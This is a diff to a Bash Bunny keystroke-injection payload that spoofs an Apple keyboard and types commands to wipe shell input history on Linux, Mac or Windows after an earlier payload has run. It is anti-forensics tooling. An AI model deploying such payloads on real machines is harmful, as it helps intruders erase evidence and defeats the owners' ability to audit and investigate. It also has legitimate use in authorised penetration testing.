@@ -8,15 +8,14 @@
 #
 # Cleans the input history on Windows, Mac and Linux
 #
-LED R
-
 #+++ CONFIG +++
 
-# EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
-LINES=0
-OS="UNITY" #OPTIONS: "UNITY", "MAC", OR "WINDOWS"
+LINES=0 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
+OS="UNITY" # OPTIONS: "UNITY", "MAC", OR "WINDOWS"
 
 #+++ END CONFIG +++
+
+LED R
 
 # PLATFORM CHECK
 # FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
@@ -30,7 +29,7 @@ if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
     OS="UNITY"
 fi
 
-# START
+# START CLEANUP
 ATTACKMODE HID VID_0X05AC PID_0X021E
 
 QUACK DELAY 500
@@ -51,20 +50,20 @@ QUACK BACKSPACE
 QUACK DELAY 100
 
 if [ "$OS"=="UNITY" ] || [ "$OS"=="MAC" ]; then
-    LED R B 100
     QUACK STRING terminal
     QUACK DELAY 200
     QUACK ENTER
     QUACK DELAY 1000
-
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
 
     if [ "$OS"=="MAC" ]; then
         LED R B G 100
         QUACK STRING diskutil unmount /Volumes/BashBunny
         QUACK DELAY 200
+        LED R B G 100
+    else
+        LED R B 100
     fi
-    LED R B 100
 
     if [ "$LINES" -gt "0" ]; then
         QUACK STRING head -n -$LINES "~/.bash_history"
@@ -78,6 +77,11 @@ if [ "$OS"=="UNITY" ] || [ "$OS"=="MAC" ]; then
         QUACK ENTER
     fi
 else #WINDOWS
+    QUACK STRING powershell
+    QUACK DELAY 200
+    QUACK ENTER
+    QUACK DELAY 1000
+
     LED B 100
     # QUACK @echo off
     # QUACK ENTER
@@ -100,10 +104,6 @@ else #WINDOWS
     # QUACK DELAY 100
 
     if [ "$LINES" -gt "0" ]; then
-        QUACK STRING powershell
-        QUACK DELAY 200
-        QUACK ENTER
-        QUACK DELAY 1000
         QUACK STRING setlocal enableextensions enabledelayedexpansion
         QUACK ENTER
         QUACK DELAY 200
@@ -151,3 +151,4 @@ QUACK STRING exit
 QUACK ENTER
 
 LED G
+# CLEANUP FINISHED
